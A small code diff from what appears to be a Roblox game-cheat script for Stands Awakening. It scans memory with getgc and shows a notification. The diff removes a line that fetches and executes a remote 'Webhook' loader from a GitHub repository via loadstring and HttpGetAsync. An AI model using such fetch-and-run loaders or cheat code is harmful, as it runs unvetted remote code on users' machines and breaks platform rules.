@@ -18,7 +18,6 @@ for i,v in pairs(getgc(true)) do
      {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 6, Type = "image"},
      {Image = "http://www.roblox.com/asset/?id=13780014144", ImageColor = Color3.fromRGB(255, 255, 255)}
 ) wait(2)
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/InfinityHubTwo/InfinityHubScripts/main/Games/Stands%20Awakening/Webhook/Loader.lua'))('WebHook');
 
 
 
